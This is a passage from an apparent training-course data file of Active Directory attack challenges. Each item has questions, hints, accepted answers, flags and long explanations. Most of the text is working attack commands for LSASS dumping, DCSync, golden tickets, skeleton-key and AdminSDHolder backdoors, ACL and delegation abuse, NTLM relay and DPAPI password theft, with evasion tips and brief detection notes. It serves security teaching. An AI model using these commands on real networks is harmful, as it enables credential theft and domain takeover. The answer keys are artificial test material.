What Mimikatz command exports all Kerberos tickets from the current Windows session's memory so they can be injected elsewhere?`,
    hint: 'The Mimikatz module for Kerberos ticket operations is kerberos:: and the export command is sekurlsa::tickets /export.',
    answers: ['sekurlsa::tickets /export', 'sekurlsa::tickets', 'kerberos::list /export', 'mimikatz sekurlsa::tickets /export'],
    xp: 25,
    explanation: `Pass-the-Ticket — full technique breakdown:

Step 1 — Extract tickets from LSASS (requires local admin):
  mimikatz# privilege::debug
  mimikatz# sekurlsa::tickets /export
  Saves all tickets as .kirbi files in current directory
  Format: username@servicename-DOMAINNAME.kirbi

Step 2 — Inject a specific ticket into current session:
  mimikatz# kerberos::ptt [0;12345]-0-0-40e10000-administrator@krbtgt-CORP.EXAMPLE.COM.kirbi

Verify injection:
  klist   — Windows built-in, shows all cached Kerberos tickets
  dir //dc.corp.example.com/c$   — test access to DC using injected DA ticket

Over-Pass-the-Hash (Pass-the-Key) — request a real TGT using the hash:
  mimikatz# sekurlsa::pth /user:administrator /domain:corp.example.com /ntlm:HASH /run:powershell.exe

  This spawns a new PowerShell window with the requested user's Kerberos tickets.
  /aes256:AESKEY — use AES256 key instead of NT hash (more stealthy, harder to detect)
  /run:cmd.exe — specify what process to spawn

Impacket equivalent (from Linux):
  impacket-getTGT corp.example.com/administrator -hashes :NTLMHASH -dc-ip 192.168.1.10
  Output: administrator.ccache

  export KRB5CCNAME=administrator.ccache
  impacket-psexec corp.example.com/administrator@dc.corp.example.com -k -no-pass

  Flags:
    -k        — use Kerberos authentication (from ccache)
    -no-pass  — don't prompt for password (using ticket from env variable)

Ticket file formats:
  .kirbi — Windows Kerberos credential cache format (used by Mimikatz)
  .ccache — Linux MIT Kerberos credential cache format (used by Impacket)
  ticketConverter.py — converts between formats

Forging tickets without extracting (requires key material):
  impacket-ticketer — forges TGT (Golden) or TGS (Silver) tickets
  mimikatz kerberos::golden — creates Golden Ticket

Detection:
  Unusual Kerberos tickets in memory (audit with klist on endpoints)
  Tickets for accounts accessing resources they never normally access
  TGTs with unusually long lifetimes (Golden Ticket indicator)
  Pass-the-Key: AES keys from hashes are flagged by some EDR products`
  },

  // ── PHASE 6: Credential Dumping ───────────────────────────────────────────

  {
    id: 'ad-13',
    title: 'Phase 6 — LSASS Dump: Extracting Credentials from Memory',
    objective: `LSASS (Local Security Authority Subsystem Service) is the Windows process that handles authentication. It stores credentials in memory for single sign-on: NT hashes, Kerberos tickets, and sometimes plaintext passwords (WDigest, still enabled on older systems). Dumping LSASS is the most reliable way to extract credentials from a live Windows machine.

Mimikatz is the most well-known tool. Its sekurlsa::logonpasswords command reads directly from LSASS memory and extracts credentials for all sessions on the machine. This is particularly valuable on servers where multiple administrators have authenticated.

What Mimikatz command extracts all credentials (NT hashes, Kerberos keys, and potentially cleartext passwords) from LSASS memory?`,
    hint: 'The Mimikatz module is sekurlsa:: and the command is logonpasswords — run privilege::debug first to get SeDebugPrivilege.',
    answers: ['sekurlsa::logonpasswords', 'logonpasswords', 'sekurlsa::logonpasswords full', 'mimikatz sekurlsa::logonpasswords'],
    flag: 'FLAG{lsass_credentials_dumped}',
    xp: 25,
    explanation: `LSASS credential dumping — full technique breakdown:

Method 1 — Direct Mimikatz (requires SeDebugPrivilege / local admin):
  mimikatz# privilege::debug       — acquire SeDebugPrivilege
  mimikatz# sekurlsa::logonpasswords  — dump all provider credentials

Output fields:
  Username, Domain
  NTLM: the NT hash (use for PtH attacks)
  SHA1: SHA1 of password
  Kerberos:
    Password: (cleartext if WDigest enabled, null if not)
    Key List: AES256/AES128/DES keys (use for Pass-the-Key)
  tspkg: (RDP credentials, often cleartext)
  wdigest: cleartext password if WDigest is enabled (disabled by default post-2012)
  kerberos: (may show plaintext for older auth providers)

Method 2 — Dump LSASS process memory with procdump (to evade EDR):
  procdump.exe -ma lsass.exe lsass_dump.dmp
  Or using built-in Task Manager: right-click lsass.exe → Create dump file

  Then parse offline on your machine:
  mimikatz# sekurlsa::minidump lsass_dump.dmp
  mimikatz# sekurlsa::logonpasswords

Method 3 — Silent dump with comsvcs.dll (LOLBin, no tool needed):
  rundll32.exe C:/Windows/System32/comsvcs.dll, MiniDump PID_OF_LSASS lsass.dmp full
  Get LSASS PID: Get-Process lsass | Select Id

Method 4 — CrackMapExec module (remote, no files on disk):
  crackmapexec smb target -u admin -H HASH -M mimikatz
  crackmapexec smb target -u admin -H HASH --lsa     — LSA secrets (service account passwords)
  crackmapexec smb target -u admin -H HASH --sam     — SAM database (local accounts)

Credential providers Mimikatz targets:
  NTLM/MSV  — NT hashes for all logged-on users
  Kerberos  — tickets and Kerberos keys
  WDigest   — cleartext if enabled (reg: HKLM/System/CurrentControlSet/Control/SecurityProviders/WDigest, UseLogonCredential=1)
  TsPkg     — Terminal Services / RDP credentials
  LiveSSP   — Microsoft Live / Outlook credentials
  DPAPI     — data protection master keys (browser passwords, certificate keys)

Defenses against LSASS dumping:
  Windows Defender Credential Guard (LSA in VTL1, Mimikatz can't read it)
  Protected Process Light (PPL) for LSASS (mimidrv.sys bypasses — advanced)
  EDR kernel callbacks on NtReadVirtualMemory targeting LSASS
  ASR rule: Block credential stealing from Windows LSASS`
  },

  {
    id: 'ad-14',
    title: 'Phase 6 — NTDS.dit Extraction: Offline Domain Hash Dump',
    objective: `If you have Domain Admin privileges, you can extract NTDS.dit directly from the Domain Controller. This file contains NT hashes for EVERY account in the domain. However, NTDS.dit is locked by the AD service while the DC is running — you cannot simply copy it.

The Volume Shadow Copy (VSS) technique creates a shadow copy of the volume, allowing you to copy the locked NTDS.dit from the shadow copy. You also need the SYSTEM registry hive because NTDS.dit is encrypted with the domain's Boot Key, which is stored in SYSTEM.

What Impacket tool performs a DCSync-like hash extraction OR can parse a dumped NTDS.dit and SYSTEM hive to extract all password hashes?`,
    hint: 'The Impacket tool that dumps secrets including from NTDS.dit is called secretsdump — run as impacket-secretsdump.',
    answers: ['impacket-secretsdump', 'secretsdump.py', 'secretsdump', 'impacket-secretsdump -ntds'],
    xp: 25,
    explanation: `NTDS.dit extraction — multiple methods:

METHOD 1 — DCSync (remote, no files, requires DA rights):
  impacket-secretsdump corp.example.com/administrator:password@192.168.1.10 -just-dc-ntlm
  impacket-secretsdump corp.example.com/administrator:password@192.168.1.10 -just-dc  (includes Kerberos keys)

  Flags:
    -just-dc-ntlm  — only NT hashes (faster, smaller output)
    -just-dc       — NT hashes + Kerberos keys (AES256, AES128)
    -just-dc-user username  — dump only one specific user
    -history       — include password history hashes

METHOD 2 — Volume Shadow Copy (VSS) on the DC directly:
  # Create shadow copy:
  vssadmin create shadow /for=C:
  # Output: Shadow Copy Volume Name: //GLOBALROOT/Device/HarddiskVolumeShadowCopy1

  # Copy NTDS.dit from shadow:
  copy //GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/ntds.dit C:/Temp/ntds.dit

  # Copy SYSTEM hive (needed for Boot Key / decryption):
  copy //GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/Temp/SYSTEM

  # Parse offline:
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

METHOD 3 — ntdsutil (built-in Windows tool, very stealthy):
  ntdsutil "ac i ntds" "ifm" "create full C:/Temp/NTDS" q q
  This creates a full IFM (Install from Media) backup including NTDS.dit and SYSTEM.
  Designed for legitimate DC promotion — rarely flagged by AV.

  Parse the result:
  impacket-secretsdump -ntds C:/Temp/NTDS/Active Directory/ntds.dit -system C:/Temp/NTDS/registry/SYSTEM LOCAL

METHOD 4 — Shadow copy via PowerShell (evades some monitoring):
  $s = (Get-WmiObject -Class Win32_ShadowCopy -List).Create("C:","ClientAccessible")
  $sc = Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $s.ShadowID}
  $p = $sc.DeviceObject + ""
  cmd /c mklink /d C:/sc "$p"
  xcopy /s C:/sc/Windows/NTDS/ntds.dit C:/Temp\

secretsdump output format:
  sAMAccountName:RID:LMHash:NTHash:::
  administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e2ec1ea990ee...:::

Post-extraction actions:
  Save krbtgt hash → Golden Ticket creation
  Save Administrator hash → Pass-the-Hash to all systems
  Feed all hashes to hashcat with ntlm mode (mode 1000) for offline cracking`
  },

  {
    id: 'ad-15',
    title: 'Phase 6 — DPAPI: Decrypting Credential Blobs',
    objective: `DPAPI (Data Protection API) is Windows' built-in encryption system used by browsers, credential manager, RDP, and many applications to store secrets. DPAPI encrypts data using keys derived from the user's password. With the user's credentials (password or NT hash), you can decrypt all their DPAPI-protected secrets.

DPAPI master keys are stored in the user profile and are themselves encrypted with the user's password. Mimikatz can decrypt these. Once you have the master key, you can decrypt all secrets protected by it: Chrome saved passwords, Windows Credential Manager, certificate private keys.

What Mimikatz command decrypts DPAPI-protected credential manager entries from the current user's credential vault?`,
    hint: 'The Mimikatz module for DPAPI is dpapi:: and vaulting operations use dpapi::cred for credential files.',
    answers: ['dpapi::cred', 'vault::cred', 'dpapi::masterkey', 'dpapi::cred /in:file /masterkey:key', 'sekurlsa::dpapi'],
    xp: 20,
    explanation: `DPAPI credential decryption — full breakdown:

DPAPI Architecture:
  User password → PBKDF2 → User Master Key (stored in %APPDATA%/Microsoft/Protect/SID/)
  Application data → CryptProtectData() API → Encrypted blob (stored per application)
  Decryption requires: encrypted blob + master key + optionally user SID

Step 1 — Extract DPAPI master keys from LSASS (domain-cached):
  mimikatz# sekurlsa::dpapi
  Shows master keys for all currently logged-on users
  These are the decrypted master keys — save them

Step 2 — Decrypt credential manager entries:
  # List vault entries
  vault::list

  # Enumerate credential files
  dir /a %localappdata%/Microsoft/Credentials\
  dir /a %appdata%/Microsoft/Credentials\

  # Decrypt a credential file (need master key):
  dpapi::cred /in:C:/Users/admin/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96CDCEDFC

  # Output: target server, username, password/hash

Step 3 — Crack the master key if you only have NT hash (not LSASS access):
  impacket-dpapi masterkey -file C:/Users/user/AppData/Roaming/Microsoft/Protect/SID/GUID -sid S-1-5-21-...-1001 -password "userpassword"
  impacket-dpapi masterkey -file masterkey.bin -sid S-1-5-21-...-1001 -hash NTLM_HASH

  Output: masterkey GUID:HEXKEY

Step 4 — Decrypt Chrome saved passwords:
  # Chrome stores passwords at: %LOCALAPPDATA%/Google/Chrome/User Data/Default/Login Data (SQLite)
  # Encrypted with DPAPI using AES key wrapped with DPAPI
  impacket-dpapi chrome --logindata "C:/Users/user/AppData/Local/Google/Chrome/User Data/Default/Login Data" --masterkey GUID:KEY

SharpDPAPI (C# tool — better evasion):
  SharpDPAPI.exe triage       — find and decrypt all DPAPI material
  SharpDPAPI.exe credentials  — credential manager blobs
  SharpDPAPI.exe certificates — certificate private keys (critical for AD CS attacks)

Common DPAPI-protected secrets worth targeting:
  Windows Credential Manager — RDP passwords, network share passwords, application passwords
  Chrome/Edge/Firefox — saved website passwords
  Outlook PST/OST encryption keys
  Certificate private keys (EFS encryption, HTTPS client certs, smart card certs)
  AWS/Azure CLI stored credentials`
  },

  // ── PHASE 7: Domain Dominance ─────────────────────────────────────────────

  {
    id: 'ad-16',
    title: 'Phase 7 — DCSync: Replicating Every Hash from the Domain',
    objective: `DCSync is the premier technique for obtaining all password hashes from a domain without touching the Domain Controller's disk. It abuses the MS-DRSR (Directory Replication Service Remote Protocol) — the legitimate protocol that DCs use to synchronise data with each other.

By claiming to be a Domain Controller, an attacker with the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges can request that the real DC "replicate" all user objects — including their NT hashes. These rights are held by Domain Admins, Enterprise Admins, and any accounts that have been delegated replication rights.

What Impacket tool performs DCSync to extract all NT hashes from the domain without dropping files on the DC?`,
    hint: 'The Impacket tool dumps domain secrets remotely. It is called secretsdump and is run as impacket-secretsdump with the -just-dc-ntlm flag.',
    answers: ['impacket-secretsdump', 'secretsdump.py', 'secretsdump', 'lsadump::dcsync'],
    flag: 'FLAG{dcsync_all_hashes_extracted}',
    xp: 30,
    explanation: `DCSync attack — complete reference:

Attack command (remote, from Linux):
  impacket-secretsdump corp.example.com/administrator:password@192.168.1.10 -just-dc-ntlm
  impacket-secretsdump corp.example.com/administrator@192.168.1.10 -hashes :NTLMHASH -just-dc-ntlm

  Dump single user:
  impacket-secretsdump corp.example.com/admin:pass@dc_ip -just-dc-user krbtgt

Attack command (from Windows / Mimikatz):
  mimikatz# lsadump::dcsync /domain:corp.example.com /all /csv
  mimikatz# lsadump::dcsync /domain:corp.example.com /user:krbtgt
  mimikatz# lsadump::dcsync /domain:corp.example.com /user:administrator

Output format:
  Username:RID:LMHash:NTHash:::
  administrator:500:aad3...:8846f7eaee8fb117ad06bdd830b7586c:::
  krbtgt:502:aad3...:3e2ec1ea990ee...:::

Priority targets for DCSync:
  krbtgt       — RID 502, enables Golden Ticket creation (King of the domain)
  Administrator — RID 500, can PtH everywhere this account has access
  All domain admins — lateral movement across everything they manage
  Service accounts — may have other systems' credentials

Who can DCSync (has replication rights):
  Domain Admins (by default)
  Enterprise Admins (by default)
  SYSTEM account on DCs
  Any account granted DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
  Find in BloodHound: "Find Principals with DCSync Rights" query

Granting DCSync rights (for backdoor — requires DA):
  Modify the domain object's DACL to add replication rights to any account.
  impacket-dacledit -action write -rights DCSync -target-dn "DC=corp,DC=example,DC=com" -principal backdooruser domain/admin:pass@dc_ip

  Or with PowerView:
  Add-ObjectACL -TargetIdentity "DC=corp,DC=example,DC=com" -PrincipalIdentity backdooruser -Rights DCSync

Detection:
  Event 4662 — operation performed on object, with GUIDs:
    {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} — DS-Replication-Get-Changes
    {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} — DS-Replication-Get-Changes-All
  Source IP is NOT a known DC IP — strongest indicator
  Microsoft Defender for Identity has a specific DCSync alert
  Baseline: log the IP addresses of all DCs, alert on replication from others`
  },

  {
    id: 'ad-17',
    title: 'Phase 7 — Golden Ticket: Forging TGTs with the krbtgt Hash',
    objective: `You have the krbtgt hash from DCSync. A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) signed with the krbtgt key. Because you sign it yourself with the real krbtgt key, it is cryptographically indistinguishable from a legitimate TGT. You can embed any group memberships, any username, and set an expiry up to 10 years in the future.

This is the ultimate persistent access mechanism in Active Directory. Even if every password in the domain is reset, your Golden Ticket remains valid until the krbtgt account password is rotated twice.

In Mimikatz, what specific command creates and injects a Golden Ticket into the current session?`,
    hint: 'The Mimikatz command is kerberos::golden with flags for /user, /domain, /sid, /krbtgt (hash), and /ptt to inject into session.',
    answers: ['kerberos::golden', 'kerberos::golden /ptt', 'mimikatz kerberos::golden', 'kerberos::golden /user:admin /krbtgt:HASH /ptt'],
    xp: 30,
    explanation: `Golden Ticket — complete creation and usage guide:

Prerequisites:
  - Domain FQDN: corp.example.com
  - Domain SID: S-1-5-21-3623811015-3361044348-30300820
    (get with: whoami /all, or wmic useraccount get name,sid, or impacket-lookupsid)
  - krbtgt NT hash: 3e2ec1ea990ee...
    (get with: DCSync targeting krbtgt account)

Create and inject Golden Ticket (Mimikatz):
  mimikatz# kerberos::golden /user:fakeadmin /domain:corp.example.com /sid:S-1-5-21-...-... /krbtgt:3e2ec1ea990ee... /ptt

  Flags explained:
    /user:fakeadmin   — can be ANY name, even non-existent in AD
    /domain:          — domain FQDN
    /sid:             — domain SID (NOT user SID — the domain SID without the RID)
    /krbtgt:          — krbtgt NT hash
    /id:              — RID to embed in PAC (default 500 = Administrator)
    /groups:          — group RIDs to include (default: 513,512,520,518,519)
                        512 = Domain Admins, 519 = Enterprise Admins
    /ptt              — inject into current session (Pass-The-Ticket)
    /ticket:golden.kirbi — save to file instead of injecting

  /startoffset:-10   — start ticket 10 minutes in the past (avoids clock skew issues)
  /endin:600         — valid for 600 minutes (10 hours, matching default TGT lifetime)
  /renewmax:10080    — renewable for 10080 minutes (7 days, matching default)

Verify the injected ticket:
  klist
  — Should show a ticket for krbtgt@CORP.EXAMPLE.COM

Test access:
  dir //dc.corp.example.com/c$        — access DC filesystem
  psexec //dc.corp.example.com cmd    — shell on DC
  net use * //dc.corp.example.com/c$  — map drive

Create Golden Ticket with Impacket (from Linux):
  impacket-ticketer -nthash 3e2ec1ea990ee... -domain-sid S-1-5-21-...-... -domain corp.example.com fakeadmin
  Output: fakeadmin.ccache

  export KRB5CCNAME=fakeadmin.ccache
  impacket-psexec -k -no-pass corp.example.com/fakeadmin@dc.corp.example.com

Silver Ticket (service-specific forgery — stealthier):
  mimikatz# kerberos::golden /user:admin /domain:corp.example.com /sid:DOMAIN_SID /target:sql01.corp.example.com /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt
  - Uses service account hash (not krbtgt)
  - Valid ONLY for specified service on specified host
  - NEVER contacts the DC — no authentication events whatsoever
  - /service: cifs (file shares), http (IIS), mssql, host (generic services)

Detection:
  Golden Tickets: Event 4672 (special privileges assigned) for unusual accounts
  Tickets with RIDs that don't exist (user ID 500 but no Administrator account)
  Kerberos tickets with impossibly long lifetimes
  Microsoft Defender for Identity: Golden Ticket attack detection`
  },

  {
    id: 'ad-18',
    title: 'Phase 7 — Skeleton Key and AdminSDHolder: Persistent Backdoors',
    objective: `Once you have Domain Admin, you need to maintain access even after defenders reset passwords. Skeleton Key is a Mimikatz technique that patches LSASS on the Domain Controller in memory — injecting a master password that works for any account in addition to their real password. Any user can authenticate with either their real password or the skeleton key password "mimikatz".

AdminSDHolder is a legitimate AD object that controls permissions on protected accounts (Domain Admins, etc.). Its DACL is propagated to all protected objects every 60 minutes by the SDProp process. By adding a backdoor account to AdminSDHolder's ACL with GenericAll rights, you create a persistent path back to Domain Admin that survives password resets.

What Mimikatz command installs a Skeleton Key on the Domain Controller, injecting a master password into LSASS?`,
    hint: 'The Mimikatz command patches LSASS for authentication bypass. It is misc::skeleton.',
    answers: ['misc::skeleton', 'lsadump::skeleton', 'mimikatz misc::skeleton', 'skeleton'],
    xp: 25,
    explanation: `Skeleton Key — installation and usage:

Install Skeleton Key (requires DA, run on DC):
  mimikatz# privilege::debug
  mimikatz# misc::skeleton

  After installation:
    All domain users can now authenticate with password "mimikatz"
    Their real passwords still work too — transparent to legitimate users
    Persists until LSASS is restarted (reboot, patch, or manual restart)

Using Skeleton Key:
  net use * //dc.corp.example.com/c$ /user:corp/administrator mimikatz
  crackmapexec smb dc_ip -u administrator -p mimikatz -d corp.example.com

Limitations:
  Memory-only — does not survive DC reboots
  Logs show successful authentication (no failed auth indicators)
  Modern EDRs detect the LSASS patching behaviour

AdminSDHolder backdoor (persistent, survives reboots):

Step 1 — Grant backdoor account GenericAll on AdminSDHolder:
  impacket-dacledit -action write -rights FullControl -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=example,DC=com" -principal backdooruser domain/admin:pass@dc_ip

  PowerView:
  Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalIdentity backdooruser -Rights All

Step 2 — Wait up to 60 minutes (or trigger SDProp manually):
  Invoke-ADSDPropagation   — PowerView function to trigger immediately
  The SDProp process copies AdminSDHolder's DACL to ALL protected objects

Step 3 — Use the backdoor:
  After propagation, backdooruser has GenericAll on:
    Domain Admins members, Enterprise Admins, Schema Admins,
    Group Policy Creator Owners, Account Operators, Server Operators,
    Print Operators, Backup Operators, Replicator

  Reset any DA's password: net user domainadmin NewPass /domain
  Add to DA group: net group "Domain Admins" backdooruser /add /domain

Protected accounts (SDProp targets):
  adminCount=1 attribute indicates an account is protected by SDProp
  Query in BloodHound or LDAP: (adminCount=1)

Removing AdminSDHolder backdoor (for defenders):
  Remove the added ACE from AdminSDHolder DACL
  Manually remove propagated ACEs from protected objects
  Run SDProp again to restore default permissions
  Check ALL adminCount=1 accounts for unexpected ACEs`
  },

  // ── PHASE 8: ACL Abuse & Delegation ──────────────────────────────────────

  {
    id: 'ad-19',
    title: 'Phase 8 — ACL Abuse: WriteDACL, GenericWrite, and Shadow Credentials',
    objective: `BloodHound has identified that your compromised user has WriteDACL on the Domain Admins group. WriteDACL means you can modify the group's access control list — specifically, you can grant yourself the AddMember right and then add yourself to Domain Admins.

Shadow Credentials is a modern ACL abuse technique using the msDS-KeyCredentialLink attribute. If you have GenericWrite on an account, you can add a certificate-based credential (a key credential) to that account. You then authenticate as that account using the certificate without knowing their password — and without requiring the vulnerable DONT_REQ_PREAUTH flag.

What PowerSploit/PowerView command adds a new ACE to an AD object's DACL to grant yourself AddMember rights on a group?`,
    hint: 'The PowerView function is Add-DomainObjectAcl (or Add-ObjectAcl in older versions) with -Rights parameter.',
    answers: ['Add-DomainObjectAcl', 'Add-ObjectAcl', 'Add-DomainObjectAcl -Rights All', 'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All'],
    flag: 'FLAG{acl_abuse_da_achieved}',
    xp: 25,
    explanation: `ACL abuse chain — WriteDACL to Domain Admin:

Step 1 — Grant yourself GenericAll on Domain Admins:
  Import-Module ./PowerView.ps1
  Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "compromiseduser" -Rights All -Verbose

  Impacket (from Linux):
  impacket-dacledit -action write -rights FullControl -target-dn "CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com" -principal compromiseduser domain/compromiseduser:pass@dc_ip

Step 2 — Add yourself to Domain Admins:
  Add-DomainGroupMember -Identity "Domain Admins" -Members "compromiseduser"
  Net group "Domain Admins" compromiseduser /add /domain

Step 3 — Verify:
  Get-DomainGroupMember -Identity "Domain Admins"
  net group "Domain Admins" /domain

Shadow Credentials attack (via msDS-KeyCredentialLink):

Requires: GenericWrite on target account

Step 1 — Add key credential to target:
  Using Whisker (C#):
  Whisker.exe add /target:targetuser /domain:corp.example.com /dc:dc.corp.example.com /path:C:/Temp/cert.pfx /password:CertPassword

  Using pyWhisker (Python/Linux):
  python3 pywhisker.py -d corp.example.com -u compromiseduser -p password --target targetuser --action add --filename output_cert

Step 2 — Authenticate as target using the certificate:
  impacket-gettgtpkinit corp.example.com/targetuser -cert-pfx output_cert.pfx -pfx-pass CertPassword targetuser.ccache
  export KRB5CCNAME=targetuser.ccache
  impacket-secretsdump -k -no-pass corp.example.com/targetuser@dc_ip -just-dc-user targetuser

  Or get NT hash directly:
  impacket-getnthash corp.example.com/targetuser -cert-pfx output_cert.pfx -pfx-pass CertPassword

ACL abuse paths summary:
  GenericAll on user     → reset password, shadow credentials, or SPN abuse then Kerberoast
  GenericAll on group    → add self to group (if group has DA rights, instant escalation)
  GenericAll on computer → constrained delegation abuse, shadow credentials
  GenericWrite on user   → set scriptPath (code exec on next logon) or add SPN then Kerberoast
  WriteDACL on anything  → grant self GenericAll, then proceed
  WriteOwner on anything → take ownership, then WriteDACL, then GenericAll
  ForceChangePassword    → reset password — noisy but direct
  ReadLAPSPassword       → read local admin password for that computer

Cleanup (remove the added ACE):
  Remove-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "compromiseduser" -Rights All`
  },

  {
    id: 'ad-20',
    title: 'Phase 8 — Constrained Delegation Abuse: S4U2Self and S4U2Proxy',
    objective: `Kerberos delegation allows a service to obtain tickets on behalf of users. Constrained Delegation restricts which services a delegated account can impersonate users to. An account configured for constrained delegation has the msDS-AllowedToDelegateTo attribute set listing which SPNs it can delegate to.

S4U2Self (Service-for-User-to-Self) allows a service to obtain a service ticket for itself on behalf of ANY user — even without that user's TGT. S4U2Proxy then uses that ticket to obtain a service ticket to the target service. This means: if you compromise a service account with constrained delegation configured, you can impersonate ANY user (including Domain Admins) to the services it delegates to.

What Impacket tool finds all accounts configured for constrained delegation in a domain?`,
    hint: 'The tool finds accounts with delegation configured. It is findDelegation.py or impacket-findDelegation.',
    answers: ['impacket-findDelegation', 'findDelegation.py', 'findDelegation', 'Get-DomainComputer -TrustedToAuth'],
    xp: 25,
    explanation: `Delegation enumeration and abuse:

Find all delegation configurations:
  impacket-findDelegation corp.example.com/user:password -dc-ip 192.168.1.10

Output columns:
  AccountName, AccountType, DelegationType, DelegationRightsTo
  Types: Unconstrained, Constrained, Resource-Based Constrained Delegation (RBCD)

Constrained Delegation Abuse (S4U2Self + S4U2Proxy):

Scenario: svcIIS has constrained delegation to CIFS/fileserver01.corp.example.com
You compromise svcIIS (via Kerberoast or credential dump).

Step 1 — S4U2Self: get a forwardable ticket for DA to svcIIS (as yourself):
  impacket-getST corp.example.com/svcIIS:svcIISpassword -spn HTTP/web01.corp.example.com -impersonate administrator -dc-ip 192.168.1.10

  Flags:
    -spn            — the service SPN to request ticket for
    -impersonate    — the user to impersonate (Domain Admin username)
    -dc-ip          — Domain Controller IP

  Output: administrator.ccache (ticket for administrator to access CIFS/fileserver01)

Step 2 — Use the ticket:
  export KRB5CCNAME=administrator.ccache
  impacket-psexec -k -no-pass corp.example.com/administrator@fileserver01.corp.example.com

Unconstrained Delegation Abuse (most powerful):
  Accounts with unconstrained delegation store the TGT of any user who authenticates to them.
  If DA authenticates to a server with unconstrained delegation (even for printing), their TGT is cached.

  Enumerate unconstrained delegation hosts:
    Get-DomainComputer -Unconstrained | select name
    LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=524288)

  Coerce DA authentication to your unconstrained delegation machine:
    SpoolSample (PrinterBug): SpoolSample.exe dc01.corp.example.com compromisedserver.corp.example.com
    PetitPotam: python3 PetitPotam.py compromisedserver dc01.corp.example.com

  Extract the TGT from LSASS on your compromised server:
    mimikatz# sekurlsa::tickets /export
    — Find the krbtgt or DC machine account TGT and inject it

Resource-Based Constrained Delegation (RBCD):
  If you have GenericWrite on a computer object, you can configure RBCD.
  Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target machine.
  Point it at an attacker-controlled computer account.
  Use S4U2Self/S4U2Proxy to get a DA ticket to the target machine.

  impacket-rbcd -action write -delegate-to TARGET$ -delegate-from ATTACKER$ domain/user:pass@dc_ip
  impacket-getST corp.example.com/ATTACKER$:password -spn CIFS/target.corp.example.com -impersonate administrator`
  },

  {
    id: 'ad-21',
    title: 'Phase 8 — NTLM Relay: Capturing and Weaponising Authentication',
    objective: `NTLM relay attacks capture NTLM authentication attempts and forward them to other services in real time. When a Windows machine broadcasts a name resolution request (LLMNR/NBT-NS) for a hostname that doesn't resolve via DNS, any machine on the subnet can answer. Responder answers these requests, directing the victim to authenticate to you. You immediately relay that authentication to another target.

This is particularly powerful combined with printer spooler abuse (PrinterBug/SpoolSample): you can force a Domain Controller to authenticate to a machine you control, then relay that DC computer account authentication to LDAP on another DC to perform RBCD or shadow credentials attacks.

What Impacket tool implements the NTLM relay attack, receiving authentication from Responder and forwarding it to target services?`,
    hint: 'The Impacket tool for NTLM relay is ntlmrelayx — run as impacket-ntlmrelayx.',
    answers: ['impacket-ntlmrelayx', 'ntlmrelayx.py', 'ntlmrelayx', 'impacket-ntlmrelayx -tf targets.txt'],
    flag: 'FLAG{ntlm_relay_compromised}',
    xp: 25,
    explanation: `NTLM Relay — complete attack chain:

Setup Phase:

Step 1 — Disable SMB and HTTP in Responder (so it captures but doesn't respond):
  nano /etc/responder/Responder.conf
  Set: SMB = Off, HTTP = Off
  (ntlmrelayx will be the actual listener)

Step 2 — Run Responder to poison name resolution:
  responder -I eth0 -rdwv
  -r = WPAD/proxy abuse
  -d = DHCP poisoning (cross-subnet)
  -w = WPAD rogue server
  -v = verbose

Step 3 — Run ntlmrelayx to relay to targets:

Basic relay (SMB to SMB — requires SMB signing disabled on target):
  impacket-ntlmrelayx -tf smb_unsigned_targets.txt -smb2support

  Flags:
    -tf targets.txt   — file with target IPs (one per line, SMB signing disabled)
    -smb2support      — support SMBv2 in addition to SMBv1
    -c "command"      — execute command when relay succeeds (e.g., add admin user)
    -e payload.exe    — upload and execute binary
    -socks            — create SOCKS proxy for each relayed session
    -l loot_dir       — automatically dump SAM/LSA/NTDS from relayed sessions

Find SMB signing disabled targets:
  crackmapexec smb 192.168.1.0/24 --gen-relay-list smb_unsigned.txt

Relay to LDAP (most powerful — can work even if SMB signing is enabled):
  impacket-ntlmrelayx -t ldap://dc01.corp.example.com -smb2support --delegate-access
  — Creates a new computer account with RBCD rights to the authenticated machine
  — Then use getST to get DA ticket

Relay to LDAP for shadow credentials:
  impacket-ntlmrelayx -t ldap://dc01.corp.example.com -smb2support --shadow-credentials --shadow-target targetmachine$

PrinterBug forced authentication (coerce DC auth to relay):
  python3 printerbug.py corp.example.com/user:pass@dc01.corp.example.com attacker_ip
  — Forces DC01 to authenticate to your machine
  — Relay that DC machine account auth to LDAP on DC02

WebDAV + NTLM relay (works without Responder):
  NTLM over HTTP (WebDAV) is not blocked by SMB signing
  python3 PetitPotam.py -u "" -p "" attacker_ip dc01.corp.example.com  — unauthenticated
  Relay the HTTP authentication to LDAP

Detection and mitigations:
  Enable SMB signing on ALL machines via GPO
  Disable LLMNR: GPO Computer > Admin Templates > DNS Client > Turn off multicast name resolution
  Disable NBT-NS: Network adapter properties > TCP/IP > Advanced > WINS > Disable NetBIOS
  Enable EPA (Extended Protection for Authentication) on LDAP/LDAPS
  Require LDAP signing and channel binding`
  },

  {
    id: 'ad-22',
    title: 'Phase 8 — Defence & Detection: Hardening Active Directory',
    objective: `After a successful full-domain compromise, you write a comprehensive remediation report. The organisation needs to understand not just the fixes but the priority order and the detection capabilities they need to build.

The Microsoft Privileged Access Workstation (PAW) model and the AD Tiering model prevent credential theft from lower-trust environments from reaching Domain Admin credentials. In the Microsoft Tier Model, Tier 0 contains Domain Controllers and their management systems.

